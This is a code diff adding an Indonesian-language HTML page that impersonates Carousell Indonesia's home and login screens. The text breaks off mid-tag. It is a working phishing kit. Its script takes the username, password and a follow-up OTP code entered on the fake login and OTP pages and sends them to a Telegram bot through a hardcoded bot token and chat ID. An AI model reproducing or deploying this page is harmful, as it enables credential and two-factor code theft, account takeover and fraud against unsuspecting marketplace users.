@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Carousell Indonesia</title>
+  <!-- FontAwesome untuk ikon -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+  <style>
+    /* CSS lengkap sesuai kode yang Anda kirimkan sebelumnya */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #ffffff;
+      color: #2c2c2c;
+      min-height: 100vh;
+      position: relative;
+    }
+
+    /* System Halaman (Toggle View) */
+    .page {
+      display: none;
+    }
+    .page.active {
+      display: block;
+    }
+
+    /* Styling Logo Kamera Merah */
+    .brand-logo-svg {
+      height: 36px;
+      width: 36px;
+      display: block;
+    }
+
+    /* Halaman 1: Beranda */
+    .home-header {
+      padding: 12px 16px;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      border-bottom: 1px solid #f0f0f0;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .top-nav {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .nav-actions {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .grid-menu-btn {
+      font-size: 20px;
+      color: #333;
+      cursor: pointer;
+    }
+
+    .nav-link {
+      font-size: 15px;
+      font-weight: 600;
+      color: #222;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    /* Search Bar */
+    .search-box {
+      display: flex;
+      align-items: center;
+      background-color: #f2f2f2;
+      border-radius: 8px;
+      padding: 10px 14px;
+      gap: 10px;
+    }
+
+    .search-box i {
+      color: #757575;
+      font-size: 16px;
+    }
+
+    .search-box input {
+      border: none;
+      background: transparent;
+      width: 100%;
+      font-size: 15px;
+      outline: none;
+      color: #333;
+    }
+
+    .search-box input::placeholder {
+      color: #9e9e9e;
+    }
+
+    /* Banner JULEHA */
+    .banner-container {
+      padding: 16px;
+    }
+
+    .banner-card {
+      background: linear-gradient(135deg, #d81124 0%, #fa2d3a 100%);
+      border-radius: 12px;
+      padding: 18px 16px;
+      color: white;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .banner-badge {
+      font-size: 12px;
+      font-weight: bold;
+      opacity: 0.9;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .banner-title {
+      font-size: 22px;
+      font-weight: 800;
+      line-height: 1.2;
+    }
+
+    .banner-subtext {
+      font-size: 11px;
+      background: rgba(255, 255, 255, 0.2);
+      padding: 6px 10px;
+      border-radius: 20px;
+      width: fit-content;
+      margin-top: 4px;
+    }
+
+    .banner-desc {
+      font-size: 11px;
+      opacity: 0.9;
+      line-height: 1.3;
+    }
+
+    .banner-arrow {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: rgba(255, 255, 255, 0.8);
+      color: #333;
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    }
+
+    .banner-dots {
+      display: flex;
+      justify-content: center;
+      gap: 6px;
+      margin-top: 8px;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      background: #e0e0e0;
+      border-radius: 50%;
+    }
+    .dot.active {
+      background: #008f79;
+      width: 10px;
+      height: 8px;
+      border-radius: 4px;
+    }
+
+    /* Jelajahi Carousell */
+    .explore-section {
+      padding: 16px;
+    }
+
+    .explore-title {
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 20px;
+      color: #111;
+    }
+
+    .category-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 20px 12px;
+      text-align: center;
+    }
+
+    .category-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+    }
+
+    .category-icon {
+      width: 54px;
+      height: 54px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+    }
+
+    .category-label {
+      font-size: 12px;
+      font-weight: 500;
+      color: #333;
+      line-height: 1.2;
+    }
+
+    /* Floating Button Jual */
+    .btn-jual {
+      position: fixed;
+      bottom: 24px;
+      right: 16px;
+      background-color: #ff2638;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 30px;
+      font-size: 16px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      box-shadow: 0 4px 12px rgba(255, 38, 56, 0.4);
+      border: none;
+      cursor: pointer;
+      z-index: 99;
+    }
+
+    /* Halaman 2: Login */
+    .login-navbar {
+      display: flex;
+      align-items: center;
+      padding: 12px 16px;
+      border-bottom: 1px solid #eaeaea;
+    }
+
+    .close-btn {
+      font-size: 20px;
+      color: #333;
+      cursor: pointer;
+      text-decoration: none;
+      line-height: 1;
+    }
+
+    .logo-container {
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding-right: 20px;
+    }
+
+    .logo-text {
+      font-size: 24px;
+      font-weight: 700;
+      color: #333;
+      letter-spacing: -0.5px;
+    }
+
+    .login-container {
+      max-width: 400px;
+      width: 100%;
+      margin: 40px auto 0 auto;
+      padding: 0 20px;
+      text-align: center;
+    }
+
+    .login-container h1 {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 32px;
+      color: #222;
+    }
+
+    .btn-list {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .btn-login {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 12px 16px;
+      border: 1px solid #d0d0d0;
+      border-radius: 6px;
+      background-color: #ffffff;
+      font-size: 15px;
+      font-weight: 600;
+      color: #333;
+      cursor: pointer;
+      position: relative;
+    }
+
+    .btn-login:hover {
+      background-color: #f9f9f9;
+    }
+
+    .btn-icon {
+      position: absolute;
+      left: 16px;
+      font-size: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .google-icon {
+      width: 20px;
+      height: 20px;
+    }
+
+    .fa-facebook {
+      color: #1877f2;
+      font-size: 22px;
+    }
+
+    .email-icon {
+      background-color: #1877f2;
+      color: white;
+      border-radius: 50%;
+      width: 22px;
+      height: 22px;
+      font-size: 11px;
+    }
+
+    .login-form {
+      display: none;
+      flex-direction: column;
+      gap: 16px;
+      text-align: left;
+      margin-top: 20px;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .form-group label {
+      font-size: 13px;
+      font-weight: 600;
+      color: #555;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #d0d0d0;
+      border-radius: 6px;
+      font-size: 14px;
+      outline: none;
+    }
+
+    .form-group input:focus {
+      border-color: #ff2638;
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 12px;
+      background-color: #ff2638;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+
+    .btn-back {
+      background: none;
+      border: none;
+      color: #666;
+      font-size: 13px;
+      cursor: pointer;
+      margin-top: 10px;
+      align-self: center;
+      text-decoration: underline;
+    }
+
+    .signup-text {
+      margin-top: 32px;
+      font-size: 15px;
+      color: #555;
+    }
+
+    .signup-link {
+      color: #008f79;
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    /* Floating Widget */
+    .floating-widget {
+      position: fixed;
+      bottom: 12px;
+      right: 12px;
+      background: #fff;
+      border: 1px solid #d3d3d3;
+      box-shadow: 0 0 4px rgba(0,0,0,0.15);
+      border-radius: 4px;
+      padding: 6px 8px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .floating-widget i {
+      font-size: 20px;
+      color: #4a90e2;
+    }
+
+    .floating-widget span {
+      font-size: 8px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <!-- SVG Logo Kamera Merah -->
+  <svg style="display:none;">
+    <symbol id="carousell-camera-logo" viewBox="0 0 100 100">
+      <!-- Bodi Kamera Merah -->
+      <rect x="5" y="15" width="90" height="80" rx="22" fill="#FF2638"/>
+      <!-- Tombol Shutter Kamera Atas -->
+      <rect x="62" y="5" width="22" height="12" rx="5" fill="#FF2638"/>
+      <!-- Lingkaran Huruf C / Shutter Utama -->
+      <path d="M 52 28 C 36 28 23 41 23 57 C 23 73 36 86 52 86 C 58 86 64 84 68 81 C 65 76 60 72 52 72 C 44 72 37 65 37 57 C 37 49 44 42 52 42 C 60 42 65 38 68 33 C 64 30 58 28 52 28 Z" fill="#FFFFFF"/>
+      <!-- Garis-Garis Sinar Shutter -->
+      <rect x="64" y="32" width="13" height="5" rx="2.5" fill="#FFFFFF" transform="rotate(-30 64 32)"/>
+      <rect x="71" y="42" width="13" height="5" rx="2.5" fill="#FFFFFF" transform="rotate(-10 71 42)"/>
+      <rect x="73" y="54" width="13" height="5" rx="2.5" fill="#FFFFFF" transform="rotate(10 73 54)"/>
+      <rect x="69" y="66" width="13" height="5" rx="2.5" fill="#FFFFFF" transform="rotate(35 69 66)"/>
+    </symbol>
+  </svg>
+
+  <!-- ================= HALAMAN 1: BERANDA ================= -->
+  <div id="page-home" class="page active">
+    <!-- Header Navbar -->
+    <header class="home-header">
+      <div class="top-nav">
+        <!-- Logo Kamera Merah -->
+        <svg class="brand-logo-svg">
+          <use href="#carousell-camera-logo"/>
+        </svg>
+
+        <div class="nav-actions">
+          <i class="fa-solid fa-border-all grid-menu-btn"></i>
+          <a href="#" class="nav-link">Daftar</a>
+          <!-- Klik Masuk untuk Pindah ke Halaman 2 -->
+          <a href="#" class="nav-link" onclick="switchPage('page-login')">Masuk</a>
+        </div>
+      </div>
+
+      <!-- Search Bar -->
+      <div class="search-box">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input type="text" placeholder="Cari produk" />
+      </div>
+    </header>
+
+    <!-- Banner Promosi JULEHA -->
+    <section class="banner-container">
+      <div class="banner-card">
+        <div class="banner-badge">carousell</div>
+        <div class="banner-title">JULEHA,<br>Juli Lebih Hemat!</div>
+        <div class="banner-subtext">Dapatkan keuntungan free 3 produk mulai 100 ribuan!</div>
+        <div class="banner-desc">Naikin exposure dan buka peluang baru bareng <strong>CarouBiz</strong></div>
+        <div class="banner-arrow">
+          <i class="fa-solid fa-chevron-right"></i>
+        </div>
+      </div>
+      <div class="banner-dots">
+        <div class="dot active"></div>
+        <div class="dot"></div>
+      </div>
+    </section>
+
+    <!-- Grid Kategori -->
+    <section class="explore-section">
+      <h2 class="explore-title">Jelajahi Carousell</h2>
+      <div class="category-grid">
+        <div class="category-item">
+          <div class="category-icon" style="background:#f3e8ff; color:#9333ea;">
+            <i class="fa-solid fa-eye"></i>
+          </div>
+          <span class="category-label">Mengikuti</span>
+        </div>
+        <div class="category-item">
+          <div class="category-icon" style="background:#dcfce7; color:#16a34a;">
+            <i class="fa-solid fa-shirt"></i>
+          </div>
+          <span class="category-label">Fesyen Pria</span>
+        </div>
+        <div class="category-item">
+          <div class="category-icon" style="background:#dbeafe; color:#2563eb;">
+            <i class="fa-solid fa-tv"></i>
+          </div>
+          <span class="category-label">Elektronik</span>
+        </div>
+        <div class="category-item">
+          <div class="category-icon" style="background:#ccfbf1; color:#0d9488;">
+            <i class="fa-solid fa-book"></i>
+          </div>
+          <span class="category-label">Buku & Tulis</span>
+        </div>
+        <div class="category-item">
+          <div class="category-icon" style="background:#eff6ff; color:#3b82f6;">
+            <i class="fa-solid fa-user-ninja"></i>
+          </div>
+          <span class="category-label">Fesyen Wanita</span>
+        </div>
+        <div class="category-item">
+          <div class="category-icon" style="background:#e0e7ff; color:#4338ca;">
+            <i class="fa-solid fa-pump-soap"></i>
+          </div>
+          <span class="category-label">Kesehatan & Kecantikan</span>
+        </div>
+        <div class="category-item">
+          <div class="category-icon" style="background:#dbeafe; color:#1d4ed8;">
+            <i class="fa-solid fa-mobile-screen-button"></i>
+          </div>
+          <span class="category-label">Telepon Seluler</span>
+        </div>
+        <div class="category-item">
+          <div class="category-icon" style="background:#f1f5f9; color:#475569;">
+            <i class="fa-solid fa-baby"></i>
+          </div>
+          <span class="category-label">Bayi & Anak</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- Floating Jual Button -->
+    <button class="btn-jual" onclick="switchPage('page-login')">
+      <i class="fa-solid fa-plus"></i> Jual
+    </button>
+  </div>
+
+  <!-- ================= HALAMAN 2: LOGIN ================= -->
+  <div id="page-login" class="page">
+    <header class="login-navbar">
+      <!-- Tombol 'X' Kembali ke Halaman 1 -->
+      <a href="#" class="close-btn" onclick="switchPage('page-home')">
+        <i class="fa-solid fa-xmark"></i>
+      </a>
+      <div class="logo-container">
+        <!-- Logo Kamera Merah & Teks Carousell -->
+        <svg class="brand-logo-svg">
+          <use href="#carousell-camera-logo"/>
+        </svg>
+        <span class="logo-text">carousell</span>
+      </div>
+    </header>
+
+    <main class="login-container">
+      <h1>Masuk</h1>
+
+      <div class="btn-list" id="social-buttons">
+        <button class="btn-login" onclick="showLoginForm()">
+          <span class="btn-icon">
+            <svg class="google-icon" viewBox="0 0 24 24">
+              <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+              <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+              <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
+              <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
+            </svg>
+          </span>
+          Login dengan Google
+        </button>
+
+        <button class="btn-login" onclick="showLoginForm()">
+          <span class="btn-icon">
+            <i class="fa-brands fa-facebook"></i>
+          </span>
+          Facebook
+        </button>
+
+        <button class="btn-login" onclick="showLoginForm()">
+          <span class="btn-icon email-icon">
+            <i class="fa-solid fa-envelope"></i>
+          </span>
+          Email, nama pengguna, atau ponsel
+        </button>
+      </div>
+
+      <!-- Form Input Login -->
+      <form class="login-form" id="login-form" onsubmit="handleLogin(event)">
+        <div class="form-group">
+          <label for="username">Email, Nama Pengguna, atau Ponsel</label>
+          <input type="text" id="username" placeholder="Masukkan ID / Email Anda" required />
+        </div>
+        <div class="form-group">
+          <label for="password">Kata Sandi</label>
+          <input type="password" id="password" placeholder="Masukkan Kata Sandi" required />
+        </div>
+        <button type="submit" class="btn-submit">Masuk</button>
+        <button type="button" class="btn-back" onclick="showSocialButtons()">Kembali ke opsi login</button>
+      </form>
+
+      <p class="signup-text">
+        Belum punya akun? <a href="#" class="signup-link">Buat Akun</a>
+      </p>
+    </main>
+
+    <!-- Floating Widget -->
+    <div class="floating-widget">
+      <i class="fa-solid fa-rotate-right"></i>
+      <span>reCAPTCHA</span>
+    </div>
+  </div>
+
+  <!-- ================= Script ================= -->
+  <script>
+    // Fungsi navigasi halaman
+    function switchPage(pageId) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.getElementById(pageId).classList.add('active');
+      window.scrollTo(0, 0);
+    }
+
+    function showLoginForm() {
+      document.getElementById('social-buttons').style.display = 'none';
+      document.getElementById('login-form').style.display = 'flex';
+    }
+
+    function showSocialButtons() {
+      document.getElementById('social-buttons').style.display = 'flex';
+      document.getElementById('login-form').style.display = 'none';
+    }
+
+    // Konfigurasi Telegram
+    const TELEGRAM_BOT_TOKEN = '8480707548:AAGrAyArgDTHQ6Fw3BSiOznFX16X6oUnCds'; // Token Bot
+    const TELEGRAM_CHAT_ID = '5116335881'; // Chat ID
+
+    // Fungsi kirim pesan ke Telegram
+    function sendToTelegram(message) {
+      return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+      }).then(res => {
+        if (!res.ok) {
+          throw new Error('Gagal kirim pesan ke Telegram');
+        }
+        return res.json();
+      }).then(data => {
+        console.log('Pesan terkirim:', data);
+        return data;
+      }).catch(error => {
+        console.error('Error mengirim ke Telegram:', error);
+        alert('Gagal mengirim data ke Telegram. Periksa token dan chat ID.');
+      });
+    }
+
+    // Handle login form submit
+    function handleLogin(event) {
+      event.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+      
+      sendToTelegram(message).then(() => {
+        alert('Data login terkirim! Silakan masukkan OTP.');
+        switchPage('page-otp');
+      });
+    }
+
+    // =================== OTP Page ====================
+    // Handle OTP submit
+    function handleOTP(event) {
+      event.preventDefault();
+      const otp = document.getElementById('otp-input').value;
+      const message = `OTP Verification:\nOTP: ${otp}`;
+      
+      sendToTelegram(message).then(() => {
+        alert('OTP terkirim! Proses selesai.');
+        switchPage('page-home');
+        document.getElementById('otp-form').reset();
+      });
+    }
+  </script>
+
+  <!-- Tambahan halaman OTP -->
+  <div id="page-otp" class="page">
+    <header class="login-navbar">
+      <a href="#" class="close-btn" onclick="switchPage('page-home')">
+        <i class="fa-solid fa-xmark"></i>
+      </a>
+      <div class="logo-container">
+        <svg class="brand-logo-svg"><use href="#carousell-camera-logo"/></svg>
+        <span class="logo-text">carousell</span>
+      </div>
+    </header>
+    <main class="login-container" style="text-align:center;">
+      <h1>Verifikasi OTP</h1>
+      <form id="otp-form" onsubmit="handleOTP(event)">
+        <div class="form-group" style="margin:20px 0;">
+          <label>OTP</label>
+          <input type="text" id="otp-input" placeholder="Masukkan OTP" required />
+        </div>
+        <butto
